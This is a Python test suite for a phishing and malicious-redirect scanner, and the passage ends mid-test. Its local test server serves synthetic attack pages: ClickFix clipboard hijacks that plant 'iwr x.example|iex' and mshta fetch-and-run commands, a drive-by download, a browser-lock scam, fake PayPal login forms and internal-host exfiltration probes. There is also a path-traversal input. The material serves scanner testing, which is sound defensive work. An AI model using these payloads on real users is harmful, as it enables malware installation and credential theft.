import os
import asyncio
import base64
import json

import pytest


def _browser_available() -> bool:
    """Skip live-browser tests when Chromium isn't installed (e.g. CI without `playwright install`)."""
    try:
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            browser.close()
        return True
    except Exception:
        return False


requires_browser = pytest.mark.skipif(
    not _browser_available(),
    reason="Chromium not installed (run: playwright install chromium)",
)


@requires_browser
@pytest.mark.asyncio
async def test_benign_scan():
    from pnakotic.src.scanner.engine import PnakoticEngine

    engine = PnakoticEngine(task_id="test-job")
    result = await engine.scan("https://www.google.com")
    assert result.target_url == "https://www.google.com"
    # google.com's inline scripts may trip the js_location heuristic (0.4); a direct,
    # unredirected visit must never read as "malicious" (> 0.6).
    assert result.malicious_score < 0.6
    assert result.is_redirect_chain_detected is False


@requires_browser
@pytest.mark.asyncio
async def test_redirect_detection():
    from pnakotic.src.scanner.engine import PnakoticEngine

    engine = PnakoticEngine(task_id="test-job")
    # http://google.com redirects to https://www.google.com/
    result = await engine.scan("http://google.com")
    assert result.is_redirect_chain_detected is True
    assert len(result.hops) >= 1


def test_artifact_safety(tmp_path):
    from pnakotic.src.scanner.artifacts import ArtifactManager

    am = ArtifactManager(base_dir=str(tmp_path / "vault"))
    with pytest.raises(ValueError):
        am.create_task_folder("../../../etc/passwd")
    with pytest.raises(ValueError):
        am.create_task_folder("!@#$%^&*")


def test_artifact_manifest_recurses(tmp_path):
    from pnakotic.src.scanner.artifacts import ArtifactManager

    am = ArtifactManager(base_dir=str(tmp_path / "vault"))
    folder = am.create_task_folder("job-1")
    (tmp_path / "vault" / "job-1" / "screenshots").mkdir()
    (tmp_path / "vault" / "job-1" / "screenshots" / "landing.png").write_bytes(b"x")

    manifest = am.get_task_manifest("job-1")
    rel_paths = [a["rel_path"] for a in manifest["artifacts"]]
    assert "screenshots/landing.png" in rel_paths


def test_scoring_ip_landing():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    result = ScanResult(target_url="http://1.2.3.4/", final_url="http://1.2.3.4/")
    result.hops = [RedirectHop(url="http://1.2.3.4/", status_code=302, mechanism="http_3xx")]
    score = PnakoticScorer().score(result)
    assert score >= 0.5  # ip_landing weight


def test_scoring_meta_refresh_and_high_value():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    result = ScanResult(target_url="http://junk.tk/", final_url="https://www.google.com/")
    result.hops = [RedirectHop(url="http://junk.tk/", mechanism="meta_refresh")]
    score = PnakoticScorer().score(result)
    # meta_refresh (0.25) + high_value_landing after a redirect (0.2); final TLD is .com
    assert abs(score - 0.45) < 1e-9


def test_scoring_suspicious_tld():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    result = ScanResult(target_url="http://x.tk/", final_url="http://x.tk/")
    assert PnakoticScorer().score(result) == pytest.approx(0.3)


def _scored(target, final, hops=(), signals=None, **metadata):
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    result = ScanResult(target_url=target, final_url=final)
    result.hops = [RedirectHop(url=target, status_code=301, mechanism=m) for m in hops]
    if signals is not None:
        result.metadata["page_signals"] = signals
    result.metadata.update(metadata)
    return PnakoticScorer().score(result), result.metadata["scoring_findings"]


_NO_SIGNALS = {"title": "", "password_inputs": 0, "forms": 0, "content_type": "text/html", "error_page": False}


def test_scoring_brand_lookalike_on_throwaway_hosting():
    target = "http://us05web-zoom-us82777747387473.pages.dev/"
    final = "https://us05web-zoom-us82777747387473.pages.dev/"
    signals = dict(_NO_SIGNALS, title="Zoom Meeting")
    score, findings = _scored(target, final, ["http_3xx"], signals)
    # brand_in_hostname + throwaway_hosting + brand_in_title (no password input, so no credential_form)
    assert score == pytest.approx(0.4 + 0.15 + 0.2)
    assert "Brand name in hostname: zoom on us05web-zoom-us82777747387473.pages.dev" in findings
    assert "Free hosting platform: pages.dev" in findings
    assert not any("Credential form" in f for f in findings)

    score, findings = _scored(target, final, ["http_3xx"], dict(signals, password_inputs=1))
    assert score == pytest.approx(0.95)  # + credential_form
    assert "Credential form impersonating zoom on us05web-zoom-us82777747387473.pages.dev" in findings


def test_scoring_google_lookalike_redirecting_to_google():
    # googleplay.com is Google's own redirector: landing on the brand's domain exempts the hostname.
    score, findings = _scored("https://googleplay.com/", "https://play.google.com/store/games", ["http_3xx"])
    assert score == pytest.approx(0.2)  # high_value_landing only
    assert not any("Brand name in hostname" in f for f in findings)
    assert not any("different domain" in f for f in findings)
    # The same hostname serving its own page is still a lookalike.
    score, findings = _scored("https://googleplay.com/", "https://googleplay.com/", ["http_3xx"])
    assert score == pytest.approx(0.4)
    assert "Brand name in hostname: google on googleplay.com" in findings


def test_scoring_cross_domain_redirect():
    score, findings = _scored("https://topbook-game.online/", "https://chinatownrestaurantau.com/", ["http_3xx"])
    assert score == pytest.approx(0.2)  # the TLD rules look at the final URL (.com)
    assert "Redirected to a different domain: topbook-game.online -> chinatownrestaurantau.com" in findings


def test_scoring_cross_domain_redirect_to_suspicious_tld():
    score, findings = _scored("https://investrixai.net/", "https://finazy3-aut44.sbs/?d=x", ["http_3xx"])
    assert score == pytest.approx(0.2 + 0.3)  # cross_domain_redirect + suspicious_tld
    assert "Suspicious TLD: .sbs" in findings


def test_scoring_same_apex_redirect_is_high_value_only():
    score, findings = _scored("http://google.com/", "https://www.google.com/", ["http_3xx"])
    assert score == pytest.approx(0.2)
    assert not any(f.startswith(("Brand name", "Redirected to")) for f in findings)
    score, _ = _scored("http://github.com/", "https://github.com/", ["http_3xx"])
    assert score == 0.0


@pytest.mark.parametrize("url", [
    "https://www.apple.com/", "https://play.google.com/", "https://mail.google.co.uk/",
    "https://www.wikipedia.org/", "https://stackoverflow.com/", "https://www.amazon.com/",
    "https://www.amazon.co.uk/", "https://outlook.live.com/",
])
def test_scoring_benign_hosts_score_zero(url):
    assert _scored(url, url)[0] == 0.0


def test_scoring_brand_matching_rules():
    # Brands of 5 or fewer letters match whole labels only; 6+ letter brands match inside a label.
    assert _scored("https://zoomer.example/", "https://zoomer.example/")[0] == 0.0
    assert _scored("https://my-zoom.example/", "https://my-zoom.example/")[0] == pytest.approx(0.4)
    assert _scored("https://paypal-login.example/", "https://paypal-login.example/")[0] == pytest.approx(0.4)
    # Country-code variants are the brand's own, but not an abused free ccTLD or a trailing-label trick.
    assert _scored("https://www.google.de/", "https://www.google.de/")[0] == 0.0
    assert _scored("https://google.tk/", "https://google.tk/")[0] == pytest.approx(0.4 + 0.3)
    assert _scored("https://google.com.evil.example/", "https://google.com.evil.example/")[0] == pytest.approx(0.4)


def test_scoring_watch_tld():
    score, findings = _scored("https://valindexo.pro/", "https://valindexo.pro/")
    assert score == pytest.approx(0.15)
    assert "Abuse-prone TLD: .pro" in findings


def test_scoring_navigation_failed_is_unweighted():
    dead = "https://ap1.myprofessionalmail.com/appsuite/#"
    score, findings = _scored("https://sso-godaddy-x.pages.dev/", dead, [], dict(_NO_SIGNALS, error_page=True),
                              navigation_failed=dead)
    base, _ = _scored("https://sso-godaddy-x.pages.dev/", dead, [], dict(_NO_SIGNALS, error_page=True))
    assert score == pytest.approx(base)
    assert "Navigation failed: ap1.myprofessionalmail.com unreachable" in findings


def test_scoring_non_html_landing_is_unweighted():
    url = "https://notable-tomato-gwy2plig-dpg5h1e6n5om.edgeone.dev/"
    score, findings = _scored(url, url, [], dict(_NO_SIGNALS, content_type="audio/mpeg"))
    base, _ = _scored(url, url, [], _NO_SIGNALS)
    assert score == pytest.approx(base) == pytest.approx(0.15)  # edgeone.dev hosting only
    assert "Landing document is not HTML: audio/mpeg" in findings


def test_scoring_credential_form_needs_a_brand():
    signals = dict(_NO_SIGNALS, title="Sign in to Outlook", password_inputs=1)
    score, findings = _scored("https://random-host.example/", "https://random-host.example/", [], signals)
    assert score == pytest.approx(0.4)
    assert "Credential form impersonating outlook on random-host.example" in findings
    assert _scored("https://outlook.live.com/", "https://outlook.live.com/", [], signals)[0] == 0.0
    # A password input with no brand anywhere scores nothing.
    plain = dict(_NO_SIGNALS, title="Log in", password_inputs=1)
    assert _scored("https://random-host.example/", "https://random-host.example/", [], plain)[0] == 0.0


def _nav_hop(mechanism, url, to):
    import json
    from pnakotic.src.scanner.models import RedirectHop

    return RedirectHop(url=url, mechanism=mechanism, evidence=json.dumps({"id": mechanism, "to": to}))


def test_scoring_same_site_js_navigation_is_unweighted():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    url = "https://www.amazon.com/"
    result = ScanResult(target_url=url, final_url=url)
    result.hops = [_nav_hop("js_location", url, url), RedirectHop(url=url, mechanism="js_obfuscation")]
    # Amazon-style: a script reloading its own page plus String.fromCharCode in the bundle.
    assert PnakoticScorer().score(result) == pytest.approx(0.1)
    findings = result.metadata["scoring_findings"]
    assert "JS navigation within the same site: www.amazon.com" in findings
    assert "JS obfuscation helpers present (no cross-site redirect)" in findings

    # Same page, but the script sends the visitor to another registrable domain.
    result.hops[0] = _nav_hop("js_location", url, "https://other.example/")
    assert PnakoticScorer().score(result) == pytest.approx(0.4 + 0.4)  # js_location + js_obfuscated
    assert "JS location manipulation" in result.metadata["scoring_findings"]

    # Unknown destination: old behaviour (counts as crossing).
    result.hops[0] = RedirectHop(url=url, mechanism="js_location")
    assert PnakoticScorer().score(result) == pytest.approx(0.8)


def test_scoring_same_site_meta_refresh_is_unweighted():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import ScanResult

    result = ScanResult(target_url="https://shop.example.com/", final_url="https://shop.example.com/")
    result.hops = [_nav_hop("meta_refresh", "https://shop.example.com/", "https://www.example.com/next")]
    assert PnakoticScorer().score(result) == 0.0
    assert "Meta refresh within the same site: shop.example.com" in result.metadata["scoring_findings"]


def test_scoring_obfuscation_with_brand_is_full_weight():
    signals = dict(_NO_SIGNALS)
    score, _ = _scored("https://paypal-login.example/", "https://paypal-login.example/",
                       ["js_obfuscation"], signals)
    assert score == pytest.approx(0.4 + 0.4)  # brand_in_hostname + js_obfuscated


def test_scoring_brand_leads_page_title():
    signals = dict(_NO_SIGNALS, title="Google Play")
    score, findings = _scored("http://plinkobonusplay.com/", "http://plinkobonusplay.com/", [], signals)
    assert score == pytest.approx(0.2)
    assert "Brand name leads page title: google on plinkobonusplay.com" in findings

    # The brand's own host, or a brand that isn't among the first three words: nothing.
    own = dict(_NO_SIGNALS, title="Android Apps on Google Play")
    assert _scored("https://play.google.com/", "https://play.google.com/", [], own)[0] == 0.0
    late = dict(_NO_SIGNALS, title="Free Android Apps on Google Play")
    assert _scored("https://apps.example/", "https://apps.example/", [], late)[0] == 0.0

    # With a password input the stronger credential_form applies instead, not both.
    score, findings = _scored("http://plinkobonusplay.com/", "http://plinkobonusplay.com/", [],
                              dict(signals, password_inputs=1))
    assert score == pytest.approx(0.4)
    assert not any(f.startswith("Brand name leads") for f in findings)


def test_scoring_short_brand_tokens_match_whole_labels_only():
    assert _scored("https://pineapple.com/", "https://pineapple.com/")[0] == 0.0
    assert _scored("https://upstream.example/", "https://upstream.example/")[0] == 0.0
    assert _scored("https://apple-id.example/", "https://apple-id.example/")[0] == pytest.approx(0.4)
    assert _scored("https://googleplay.com/", "https://googleplay.com/")[0] == pytest.approx(0.4)


def test_static_analyzer_b64_filter():
    from pnakotic.src.scanner.static_analyzer import StaticAnalyst

    analyst = StaticAnalyst()
    # 64-char hex hash: long alnum run, no +/= -> filtered out (no findings)
    html = "<script>var h='a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1';</script>"
    assert analyst.analyze_content(html) == []

    # Real base64 payload (>= 60 chars, contains '/') -> detected
    payload = base64.b64encode(b"\xff" * 60).decode()  # '////' * 20
    findings = analyst.analyze_content(f"<script>var p='{payload}';</script>")
    assert any(f["id"] == "b64_payload" for f in findings)


def test_static_analyzer_meta_refresh_order_independent():
    from pnakotic.src.scanner.static_analyzer import StaticAnalyst

    analyst = StaticAnalyst()
    content_first = '<meta content="0; url=https://x.example" http-equiv="refresh">'
    equiv_first = '<meta http-equiv="refresh" content="0; url=https://x.example">'
    assert any(f["id"] == "meta_refresh" for f in analyst.analyze_content(content_first))
    assert any(f["id"] == "meta_refresh" for f in analyst.analyze_content(equiv_first))


def test_static_analyzer_js_location_variants():
    from pnakotic.src.scanner.static_analyzer import StaticAnalyst

    analyst = StaticAnalyst()
    for html in (
        "<script>window.location='https://x.example';</script>",
        "<script>document.location.href = \"https://x.example\";</script>",
        "<script>location.replace('https://x.example');</script>",
    ):
        assert any(f["id"] == "js_location_assignment" for f in analyst.analyze_content(html)), html


# ---------- fixes from review: timestamps, obfuscation, deep_chain ----------

def test_hop_and_result_timestamps_are_per_instance():
    import time
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    a = RedirectHop(url="http://a.example/", mechanism="http_3xx")
    r1 = ScanResult(target_url="http://a.example/")
    time.sleep(0.01)
    b = RedirectHop(url="http://b.example/", mechanism="http_3xx")
    r2 = ScanResult(target_url="http://b.example/")
    assert b.timestamp > a.timestamp
    assert r2.start_time > r1.start_time


def test_obfuscation_signatures_are_not_redirects():
    from pnakotic.src.scanner.models import REDIRECT_MECHANISMS
    from pnakotic.src.scanner.static_analyzer import SIGNATURE_MECHANISMS

    for sig in ("js_atob", "js_fromCharCode"):
        assert SIGNATURE_MECHANISMS[sig] not in REDIRECT_MECHANISMS
    # Regex hits only show redirect code is present; a redirect that fires is observed via CDP.
    for sig in ("js_location_assignment", "meta_refresh"):
        assert SIGNATURE_MECHANISMS[sig] not in REDIRECT_MECHANISMS
    assert SIGNATURE_MECHANISMS["js_location_assignment"] == "js_location_code"
    assert SIGNATURE_MECHANISMS["meta_refresh"] == "meta_refresh_code"


def test_scoring_obfuscation_counted_once():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    result.hops = [
        RedirectHop(url="https://x.example/", mechanism="js_obfuscation"),  # atob
        RedirectHop(url="https://x.example/", mechanism="js_obfuscation"),  # fromCharCode
    ]
    # Obfuscation helpers alone (no cross-site redirect, no brand) are the weak tier: once.
    assert PnakoticScorer().score(result) == pytest.approx(0.1)
    assert "JS obfuscation helpers present (no cross-site redirect)" in result.metadata["scoring_findings"]

    # Next to a cross-site observed redirect they are the full 0.4, still counted once.
    result.hops.append(RedirectHop(url="https://x.example/", status_code=302, mechanism="http_3xx",
                                   headers={"location": "https://y.example/"}))
    assert PnakoticScorer().score(result) == pytest.approx(0.4)
    assert "JS obfuscation helpers (atob / String.fromCharCode)" in result.metadata["scoring_findings"]


def test_scoring_deep_chain_ignores_static_hops():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    passive = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    passive.hops = [RedirectHop(url="https://x.example/", mechanism="static_analysis") for _ in range(6)]
    assert PnakoticScorer().score(passive) == 0.0

    # Same apex before and after, so cross_domain_redirect stays out of this deep_chain-only case.
    deep = ScanResult(target_url="https://x.example/", final_url="https://www.x.example/")
    deep.hops = [RedirectHop(url=f"https://h{i}.example/", status_code=302, mechanism="http_3xx") for i in range(6)]
    assert PnakoticScorer().score(deep) == pytest.approx(0.2)


def test_scoring_redirect_code_present_counted_once():
    from pnakotic.src.intelligence.scorer import PnakoticScorer
    from pnakotic.src.scanner.models import RedirectHop, ScanResult

    result = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
    result.hops = [
        RedirectHop(url="https://x.example/", mechanism="meta_refresh_code"),
        RedirectHop(url="https://x.example/", mechanism="meta_refresh_code"),
        RedirectHop(url="https://x.example/", mechanism="js_location_code"),
        RedirectHop(url="https://x.example/", mechanism="js_location_code"),
        RedirectHop(url="https://x.example/", mechanism="js_location_code"),
    ]
    assert PnakoticScorer().score(result) == pytest.approx(0.25)  # 0.1 + 0.15, once each
    findings = result.metadata["scoring_findings"]
    assert findings.count("Meta refresh code present (did not fire)") == 1
    assert findings.count("JS location code present (did not fire)") == 1


def test_launch_options_channel(monkeypatch):
    from pnakotic.src.scanner.engine import launch_options

    monkeypatch.delenv("BROWSER_CHANNEL", raising=False)
    opts = launch_options(4321)
    assert "channel" not in opts
    assert opts["chromium_sandbox"] is True
    assert opts["proxy"] == {"server": "socks5://127.0.0.1:4321"}

    monkeypatch.setenv("BROWSER_CHANNEL", " chrome ")
    assert launch_options(1)["channel"] == "chrome"


# ---------- engine against a local server (offline) ----------

@pytest.fixture(scope="module")
def local_site():
    """127.0.0.1 server. Records (Host header, path) for every request it receives."""
    import threading
    import time
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    hits = []

    class Server(ThreadingHTTPServer):
        daemon_threads = True  # /slow sleeps 20 s; don't let it hold up interpreter exit

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            hits.append((self.headers.get("Host", "").split(":")[0], self.path))
            port = self.server.server_address[1]
            redirects = {
                "/r": "/target",
                "/imgr": "/img",
                "/to-internal": f"http://localhost:{port}/target",
            }
            iphone = "iPhone" in (self.headers.get("User-Agent") or "")
            if self.path == "/cloak-302" and iphone:  # phones sent to another site, harmless there
                self.send_response(302)
                self.send_header("Location", f"http://localhost:{port}/target")
                self.end_headers()
                return
            if self.path in redirects:
                self.send_response(302)
                self.send_header("Location", redirects[self.path])
                self.end_headers()
                return
            if self.path == "/slow":  # a response that outlives any test timeout
                time.sleep(20)
                try:
                    self.send_response(200)
                    self.end_headers()
                except OSError:
                    pass
                return
            if self.path == "/ok-ws":  # an allowed WebSocket upgrade: arriving is the point
                self.send_response(400)
                self.end_headers()
                return
            if self.path == "/evil.js":  # an injected script carrying the synthetic skimmer marker
                self.send_response(200)
                self.send_header("Content-Type", "text/javascript")
                self.end_headers()
                self.wfile.write(b"var PNAKOTIC_TEST_SKIMMER = 1;")
                return
            if self.path == "/sw.js":
                self.send_response(200)
                self.send_header("Content-Type", "text/javascript")
                self.end_headers()
                self.wfile.write(f'fetch("http://localhost:{port}/leak-sw");'.encode())
                return
            if self.path == "/audio":  # a non-HTML landing document; Chrome wraps it in a <video> element
                self.send_response(200)
                self.send_header("Content-Type", "audio/mpeg")
                self.end_headers()
                self.wfile.write(b"\xff\xfb\x90\x00" * 8)
                return
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            if self.path == "/pw":
                self.wfile.write(b"<html><head><title>Sign in to PayPal</title></head>"
                                 b"<body><form><input type=password></form></body></html>")
            elif self.path == "/self":  # reloads itself once (the flag stops the loop)
                self.wfile.write(b"<html><script>if(!sessionStorage.getItem('r')){sessionStorage.setItem('r','1');"
                                 b"location.href=location.href}</script><body>self</body></html>")
            elif self.path == "/to-dead":
                self.wfile.write(b"<html><script>location='http://no-such-host.invalid/x'</script></html>")
            elif self.path == "/ws-main":
                self.wfile.write(f"<html><body><script>new WebSocket('ws://localhost:{port}/leak-ws');</script></body></html>".encode())
            elif self.path == "/ws-worker":
                src = f"new WebSocket('ws://localhost:{port}/leak-ws-worker');"
                self.wfile.write(
                    f"<html><body><script>new Worker(URL.createObjectURL(new Blob([\"{src}\"])));</script></body></html>".encode())
            elif self.path == "/shared-worker":
                self.wfile.write(b"<html><body><script>new SharedWorker('/sw.js');</script></body></html>")
            elif self.path == "/ws-allowed":
                self.wfile.write(f"<html><body><script>new WebSocket('ws://127.0.0.1:{port}/ok-ws');</script></body></html>".encode())
            elif self.path == "/js":
                self.wfile.write(b"<html><script>window.location='/r'</script></html>")
            elif self.path == "/meta":
                self.wfile.write(b"<html><meta http-equiv='refresh' content='0;url=/target'></html>")
            elif self.path == "/delayed":  # 9 s: must not fire during the scan (10 s page timeout, ~1 s of work after load)
                self.wfile.write(b"<html><body>wait<script>setTimeout(function(){location.replace('/target')},9000)</script></body></html>")
            elif self.path == "/js-loop-a":
                self.wfile.write(b"<html><script>window.location='/js-loop-b'</script></html>")
            elif self.path == "/js-loop-b":
                self.wfile.write(b"<html><script>window.location='/js-loop-a'</script></html>")
            elif self.path == "/never-idle":
                self.wfile.write(b"<html><body>ok<script>atob('aGVsbG8=')</script><img src='/slow'></body></html>")
            elif self.path == "/with-pixel":
                self.wfile.write(b"<html><body>page<img src='/imgr'></body></html>")
            elif self.path == "/cloak" and iphone:  # phones steered to the scam, everyone else "ok"
                self.wfile.write(f"<html><script>location='http://localhost:{port}/scam'</script></html>".encode())
            elif self.path == "/scam":
                self.wfile.write(b"<html><body>Press Windows Key + R, then CTRL + V and Enter"
                                 b"<script>atob('aGVsbG8=')</script></body></html>")
            elif self.path == "/injected":
                self.wfile.write(b"<html><body>shop<script src='/evil.js'></script></body></html>")
            elif self.path == "/with-frame":
                self.wfile.write(b"<html><body>news<iframe src='/ad-frame'></iframe></body></html>")
            elif self.path == "/ad-frame":
                self.wfile.write(b"<html><body><script>var PNAKOTIC_TEST_ADFRAME = 1;</script></body></html>")
            elif self.path == "/clickfix":  # writes on load; real ClickFix waits for a click
                self.wfile.write(b"<html><body>Verify you are human<script>"
                                 b"navigator.clipboard.writeText('powershell -w h -c \"iwr x.example|iex\"').catch(function(){});"
                                 b"</script></body></html>")
            elif self.path == "/clickfix-click":  # the real pattern: writes on the visitor's first click
                self.wfile.write(b"<html><body style='height:2000px'>Verify you are human<script>"
                                 b"document.addEventListener('click',function(){"
                                 b"navigator.clipboard.writeText('powershell -w h -c \\\"iwr x.example|iex\\\"').catch(function(){});"
                                 b"});</script></body></html>")
            elif self.path == "/clickfix-exec":  # the hidden-textarea + execCommand('copy') variant
                self.wfile.write(b"<html><body><script>var t=document.createElement('textarea');"
                                 b"t.value='mshta https://x.example/v';document.body.appendChild(t);t.select();"
                                 b"document.execCommand('copy');</script></body></html>")
            elif self.path == "/drive-by":
                self.wfile.write(b"<html><body>Your download will start<script>"
                                 b"var a=document.createElement('a');a.href='/payload.exe';a.download='Update.exe';"
                                 b"document.body.appendChild(a);a.click();</script></body></html>")
            elif self.path == "/browser-lock":
                self.wfile.write(b"<html><body>Windows Defender alert<script>"
                                 b"window.addEventListener('beforeunload',function(e){e.preventDefault();});"
                                 b"for(var i=0;i<12;i++){history.pushState({},'','#'+i);}"
                                 b"document.documentElement.requestFullscreen().catch(function(){});"
                                 b"alert('Call support');alert('Call support');alert('Call support');"
                                 b"</script></body></html>")
            elif self.path == "/hook-probe":  # can the page see that it is being watched?
                self.wfile.write(b"<html><body><script>document.title=["
                                 b"Object.getOwnPropertyNames(window).filter(function(k){return /^__[0-9a-f]{16}$/.test(k)}).length,"
                                 b"Clipboard.prototype.writeText.toString(),Function.prototype.toString.toString()].join('|');"
                                 b"</script></body></html>")
            else:
                self.wfile.write(b"<html><body>ok</body></html>")

    srv = Server(("127.0.0.1", 0), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}", hits
    srv.shutdown()


def _local_engine(tmp_path):
    """Engine whose egress policy allows only the literal 127.0.0.1 (so `localhost`,
    the same address under another name, stands in for an internal host)."""
    from pnakotic.src.scanner.artifacts import ArtifactManager
    from pnakotic.src.scanner.engine import PnakoticEngine

    async def only_loopback_literal(host):
        return host == "127.0.0.1"

    engine = PnakoticEngine(task_id="local-job", timeout_ms=10000, host_allowed=only_loopback_literal)
    engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
    return engine


@requires_browser
@pytest.mark.asyncio
async def test_subresource_redirect_is_not_a_chain(local_site, tmp_path):
    base, hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/with-pixel")
    assert ("127.0.0.1", "/img") in hits  # the pixel's redirect really happened
    assert result.is_redirect_chain_detected is False
    assert not [h for h in result.hops if h.mechanism == "http_3xx"]
    assert result.final_url == f"{base}/with-pixel"


@requires_browser
@pytest.mark.asyncio
async def test_main_frame_redirect_is_a_chain(local_site, tmp_path):
    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/r")
    http_hops = [h for h in result.hops if h.mechanism == "http_3xx"]
    assert result.is_redirect_chain_detected is True
    assert [h.url for h in http_hops] == [f"{base}/r"]
    assert result.final_url == f"{base}/target"


@requires_browser
@pytest.mark.asyncio
async def test_redirect_to_internal_host_is_blocked(local_site, tmp_path):
    base, hits = local_site
    hits.clear()
    result = await _local_engine(tmp_path).scan(f"{base}/to-internal")
    assert ("127.0.0.1", "/to-internal") in hits
    assert not [h for h in hits if h[0] == "localhost"]  # the redirect hop never left the browser
    blocked = result.metadata.get("blocked_hosts") or []
    assert "localhost" in blocked
    if not os.environ.get("BROWSER_CHANNEL"):
        assert blocked == ["localhost"]
    else:
        # Branded Chrome phones home at startup (accounts/clients2.google.com, update.googleapis.com,
        # www.google.com, www.gstatic.com) regardless of Playwright's quieting flags; the strict
        # loopback-only test policy blocks those too. The production policy allows them.
        assert all(h == "localhost" or h.endswith((".google.com", ".googleapis.com", ".gstatic.com")) for h in blocked), blocked
    assert "ERR_BLOCKED_BY_CLIENT" in (result.metadata.get("raw_error") or "")
    assert any("non-public host" in f for f in result.metadata["scoring_findings"])


@requires_browser
@pytest.mark.asyncio
async def test_internal_target_is_blocked_by_default_policy(local_site, tmp_path):
    from pnakotic.src.scanner.artifacts import ArtifactManager
    from pnakotic.src.scanner.engine import PnakoticEngine

    base, hits = local_site
    hits.clear()
    engine = PnakoticEngine(task_id="local-job", timeout_ms=10000)  # real policy
    engine.artifacts = ArtifactManager(base_dir=str(tmp_path))
    result = await engine.scan(f"{base}/target")
    assert hits == []
    assert result.metadata.get("blocked_hosts") == ["127.0.0.1"]


@requires_browser
@pytest.mark.asyncio
@pytest.mark.parametrize("page, leak", [
    ("/ws-main", "/leak-ws"),               # WebSocket from the main frame
    ("/ws-worker", "/leak-ws-worker"),      # WebSocket from a dedicated worker
    ("/shared-worker", "/leak-sw"),         # fetch() from a SharedWorker (separate CDP target)
])
async def test_websocket_and_shared_worker_cannot_reach_internal_host(local_site, tmp_path, page, leak):
    base, hits = local_site
    hits.clear()
    result = await _local_engine(tmp_path).scan(f"{base}{page}")
    await asyncio.sleep(0.5)  # let any stray connection arrive
    assert not [h for h in hits if h[0] == "localhost" or h[1] == leak]
    assert "localhost" in result.metadata.get("blocked_hosts", [])


@requires_browser
@pytest.mark.asyncio
async def test_allowed_websocket_passes_through_proxy(local_site, tmp_path):
    base, hits = local_site
    hits.clear()
    await _local_engine(tmp_path).scan(f"{base}/ws-allowed")
    await asyncio.sleep(0.5)
    assert ("127.0.0.1", "/ok-ws") in hits


@pytest.mark.asyncio
async def test_egress_proxy_socks5(local_site):
    import struct
    from urllib.parse import urlparse
    from pnakotic.src.scanner.egress_proxy import EgressProxy

    async def only_loopback_literal(host):
        return host == "127.0.0.1"

    async def connect(proxy_port, host, port):
        r, w = await asyncio.open_connection("127.0.0.1", proxy_port)
        w.write(b"\x05\x01\x00")
        assert await r.readexactly(2) == b"\x05\x00"
        w.write(b"\x05\x01\x00\x03" + bytes([len(host)]) + host.encode() + struct.pack("!H", port))
        reply = await r.readexactly(10)
        return reply[1], r, w

    base, _hits = local_site
    port = urlparse(base).port
    proxy = EgressProxy(only_loopback_literal)
    proxy_port = await proxy.start()
    try:
        rep, _r, w = await connect(proxy_port, "localhost", port)
        assert rep == 0x02
        assert proxy.blocked_hosts == ["localhost"]
        w.close()

        rep, r, w = await connect(proxy_port, "127.0.0.1", port)
        assert rep == 0x00
        w.write(b"GET /via-proxy HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
        assert (await r.read(12)).startswith(b"HTTP/1.")
        w.close()
        assert proxy.blocked_hosts == ["localhost"]
    finally:
        await proxy.stop()


def _redirect_hops(result):
    from pnakotic.src.scanner.models import REDIRECT_MECHANISMS

    return [h for h in result.hops if h.mechanism in REDIRECT_MECHANISMS]


@requires_browser
@pytest.mark.asyncio
async def test_js_redirect_is_recorded(local_site, tmp_path):
    import json

    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/js")
    js_hops = [h for h in result.hops if h.mechanism == "js_location"]
    assert len(js_hops) == 1
    assert js_hops[0].url.endswith("/js")
    evidence = json.loads(js_hops[0].evidence)
    assert evidence["id"] == "js_location"
    assert evidence["reason"] == "scriptInitiated"
    assert evidence["to"].endswith("/r")
    assert [h.url for h in result.hops if h.mechanism == "http_3xx"] == [f"{base}/r"]
    assert result.is_redirect_chain_detected is True
    assert result.final_url.endswith("/target")
    assert len(_redirect_hops(result)) == 2


@requires_browser
@pytest.mark.asyncio
async def test_meta_refresh_is_recorded(local_site, tmp_path):
    import json

    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/meta")
    meta_hops = [h for h in result.hops if h.mechanism == "meta_refresh"]
    assert len(meta_hops) == 1
    assert json.loads(meta_hops[0].evidence)["reason"] == "metaTagRefresh"
    assert result.is_redirect_chain_detected is True
    assert result.final_url.endswith("/target")


@requires_browser
@pytest.mark.asyncio
async def test_delayed_redirect_code_is_not_a_redirect(local_site, tmp_path):
    base, _hits = local_site
    result = await _local_engine(tmp_path).scan(f"{base}/delayed")  # timeout_ms=10000
    assert _redirect_hops(result) == []
    assert [h.mechanism for h in result.hops].count("js_location_code") == 1
    assert result.is_redirect_chain_detected is False
    assert result.final_url == f"{base}/delayed"
    # The 127.0.0.1 landing alone is 0.5 (ip_landing), so assert on what code-present adds:
    # 0.15, where the old regex-as-redirect scoring added 0.4 and read "Malicious" for real hosts.
    findings = result.metadata["scoring_findings"]
